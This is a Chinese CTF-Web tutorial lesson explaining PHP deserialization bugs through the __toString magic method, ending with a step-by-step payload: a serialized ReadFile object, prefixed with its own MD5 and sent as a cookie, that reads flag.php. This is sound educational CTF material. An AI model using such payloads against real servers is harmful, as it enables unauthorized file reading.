# CTF-Web历年考题精讲教程：P1：CTF考题序列化__toString 🧩

![](img/85bc626a79f6448305457a25d02b5f40_1.png)

![](img/85bc626a79f6448305457a25d02b5f40_3.png)

在本节课中，我们将要学习CTF-Web题目中一个非常常见的考点：PHP反序列化漏洞。我们将从一个简单的`__toString`魔术方法入手，逐步分析一个包含序列化与反序列化操作的完整CTF题目，理解漏洞的成因和利用方法。

![](img/85bc626a79f6448305457a25d02b5f40_5.png)

## 概述：序列化漏洞简介

![](img/85bc626a79f6448305457a25d02b5f40_7.png)

![](img/85bc626a79f6448305457a25d02b5f40_9.png)

反序列化漏洞本身在PHP语言层面并不存在。漏洞的产生主要源于应用程序在处理对象时，对某些魔术方法（Magic Methods）以及序列化/反序列化相关函数的处理不当。当传递给反序列化函数的参数可以被用户控制时，攻击者就可以构造恶意的序列化字符串。在反序列化过程中，就可能触发对象中的魔术方法，从而执行危险操作，造成危害。

![](img/85bc626a79f6448305457a25d02b5f40_11.png)

![](img/85bc626a79f6448305457a25d02b5f40_13.png)

核心在于：**反序列化的参数可控**，进而**触发魔术方法**。在PHP中，`__construct`（构造函数）和`__toString`都是常见的魔术方法。

![](img/85bc626a79f6448305457a25d02b5f40_15.png)

## 第一节：认识 `__toString` 魔术方法

![](img/85bc626a79f6448305457a25d02b5f40_17.png)

上一节我们介绍了漏洞的基本原理，本节中我们来看看一个关键的魔术方法：`__toString`。

![](img/85bc626a79f6448305457a25d02b5f40_19.png)

`__toString`是魔术方法的一种。根据PHP官方手册，当一个对象被当作字符串对待时，就会自动触发这个方法。

![](img/85bc626a79f6448305457a25d02b5f40_20.png)

![](img/85bc626a79f6448305457a25d02b5f40_22.png)

![](img/85bc626a79f6448305457a25d02b5f40_24.png)

![](img/85bc626a79f6448305457a25d02b5f40_25.png)

让我们通过一个简单的例子来理解它：

![](img/85bc626a79f6448305457a25d02b5f40_27.png)

![](img/85bc626a79f6448305457a25d02b5f40_29.png)

```php
<?php
class TestClass {
    public $variable = 'Hello';

    public function __toString() {
        return $this->variable;
    }
}

$object = new TestClass();
echo $object; // 这里会触发 __toString 方法
?>
```

以下是代码执行流程的分解：
1.  实例化`TestClass`类，创建对象`$object`。
2.  使用`echo`输出`$object`。由于`echo`期望一个字符串，PHP会将`$object`当作字符串处理。
3.  这自动触发了`__toString()`方法。
4.  `__toString()`方法返回`$this->variable`的值，即`'Hello'`。
5.  最终页面输出：`Hello`。

**关键点**：如果代码中没有直接调用`__toString`，但对象被用于字符串上下文（如`echo`, `print`, 字符串连接等），该方法会被自动调用。

## 第二节：分析一个CTF题目实例

理解了`__toString`的基础后，我们来看一个更复杂的、融合了序列化操作的CTF题目实例。我们将分析其代码，并找出利用点。

![](img/85bc626a79f6448305457a25d02b5f40_31.png)

![](img/85bc626a79f6448305457a25d02b5f40_33.png)

首先，观察题目给出的核心代码结构：

![](img/85bc626a79f6448305457a25d02b5f40_35.png)

![](img/85bc626a79f6448305457a25d02b5f40_37.png)

![](img/85bc626a79f6448305457a25d02b5f40_39.png)

```php
<?php
highlight_file(__FILE__);

![](img/85bc626a79f6448305457a25d02b5f40_41.png)

class ReadFile {
    public $filename;
    public function __toString() {
        return file_get_contents($this->filename);
    }
}

![](img/85bc626a79f6448305457a25d02b5f40_43.png)

if (isset($_COOKIE['c'])) {
    $c = $_COOKIE['c'];
    $h = substr($c, 0, 32); // 取前32位作为MD5
    $m = substr($c, 32);    // 32位之后的内容作为数据
    if (md5($m) === $h) {
        $data = unserialize($m); // 反序列化数据
        foreach ($data as $key => $value) {
            echo $value;
        }
    }
}
?>
```

![](img/85bc626a79f6448305457a25d02b5f40_45.png)

![](img/85bc626a79f6448305457a25d02b5f40_47.png)

![](img/85bc626a79f6448305457a25d02b5f40_49.png)

![](img/85bc626a79f6448305457a25d02b5f40_51.png)

代码逻辑分析：
1.  定义了一个`ReadFile`类，其`__toString`方法会读取`$filename`属性指定的文件内容并返回。
2.  检查是否存在名为`c`的Cookie。
3.  将Cookie值`$c`拆分为两部分：前32位字符`$h`，和剩余部分`$m`。
4.  验证`md5($m)`是否等于`$h`。这是一个简单的自验证机制，确保数据`$m`未被篡改。
5.  如果验证通过，则对`$m`进行反序列化，得到`$data`。
6.  遍历`$data`并输出每个值。这里的`echo $value;`是触发点：如果`$value`是一个`ReadFile`对象，就会调用其`__toString`方法。

![](img/85bc626a79f6448305457a25d02b5f40_53.png)

![](img/85bc626a79f6448305457a25d02b5f40_55.png)

**漏洞链条**：我们可控的是Cookie中的`c`。我们需要构造一个字符串，使其前32位是后面部分的MD5值，并且后面部分是一个**序列化后的数组**，数组中的元素是`ReadFile`对象，且该对象的`filename`属性指向我们想读取的文件（例如`flag.php`）。

![](img/85bc626a79f6448305457a25d02b5f40_57.png)

![](img/85bc626a79f6448305457a25d02b5f40_59.png)

![](img/85bc626a79f6448305457a25d02b5f40_60.png)

## 第三节：构造利用Payload

![](img/85bc626a79f6448305457a25d02b5f40_62.png)

上一节我们分析了漏洞触发链条，本节中我们来看看如何一步步构造出可利用的Payload。

![](img/85bc626a79f6448305457a25d02b5f40_64.png)

![](img/85bc626a79f6448305457a25d02b5f40_66.png)

![](img/85bc626a79f6448305457a25d02b5f40_68.png)

![](img/85bc626a79f6448305457a25d02b5f40_70.png)

以下是构造Payload的步骤：

![](img/85bc626a79f6448305457a25d02b5f40_72.png)

![](img/85bc626a79f6448305457a25d02b5f40_74.png)

1.  **创建恶意对象**：实例化`ReadFile`类，并将`filename`属性设置为目标文件，例如`flag.php`。
    ```php
    $obj = new ReadFile();
    $obj->filename = ‘flag.php’;
    ```

2.  **序列化对象并放入数组**：将对象序列化，并作为元素放入一个数组中。因为代码中会遍历`$data`数组。
    ```php
    $payload_array = array($obj);
    $serialized_data = serialize($payload_array);
    // 得到类似：a:1:{i:0;O:8:“ReadFile”:1:{s:8:“filename”;s:8:“flag.php”;}}
    ```

![](img/85bc626a79f6448305457a25d02b5f40_76.png)

![](img/85bc626a79f6448305457a25d02b5f40_78.png)

![](img/85bc626a79f6448305457a25d02b5f40_80.png)

3.  **生成自验证字符串**：计算`$serialized_data`的MD5哈希值，并将其与序列化字符串拼接，形成最终的Cookie值`c`。
    ```php
    $md5_hash = md5($serialized_data); // 前32位
    $final_payload = $md5_hash . $serialized_data; // 完整Cookie值
    ```

![](img/85bc626a79f6448305457a25d02b5f40_82.png)

![](img/85bc626a79f6448305457a25d02b5f40_84.png)

4.  **发送Payload**：将`$final_payload`作为Cookie `c`的值，发送给目标服务器。

![](img/85bc626a79f6448305457a25d02b5f40_86.png)

当服务器端代码执行时：
-   从Cookie `c`中取出前32位（MD5值）和后面的序列化字符串。
-   验证通过。
-   反序列化字符串，得到包含`ReadFile`对象的数组`$data`。
-   遍历`$data`，`echo $value`触发了`$obj`的`__toString()`方法。
-   `__toString()`方法执行`file_get_contents(‘flag.php’)`，从而读取并输出`flag.php`文件的内容。

![](img/85bc626a79f6448305457a25d02b5f40_88.png)

![](img/85bc626a79f6448305457a25d02b5f40_90.png)

## 总结

本节课中我们一起学习了CTF-Web中序列化漏洞的一个典型场景。我们首先了解了`__toString`魔术方法的触发机制，然后分析了一个结合MD5自验证的反序列化题目。通过构造一个包含恶意`ReadFile`对象的序列化数组，并满足其MD5校验规则，我们成功利用`__toString`方法实现了任意文件读取。

![](img/85bc626a79f6448305457a25d02b5f40_92.png)

![](img/85bc626a79f6448305457a25d02b5f40_94.png)

核心要点回顾：
1.  **漏洞根源**：用户输入可控的反序列化参数。
2.  **触发关键**：在反序列化后的对象被用于字符串操作时，自动调用`__toString`等魔术方法。
3.  **利用链**：控制对象属性 -> 序列化构造Payload -> 绕过校验 -> 触发魔术方法执行危险操作。
理解这个流程对于解决许多CTF-Web题目至关重要。在后续课程中，我们将继续深入其他类型的序列化漏洞和利用技巧。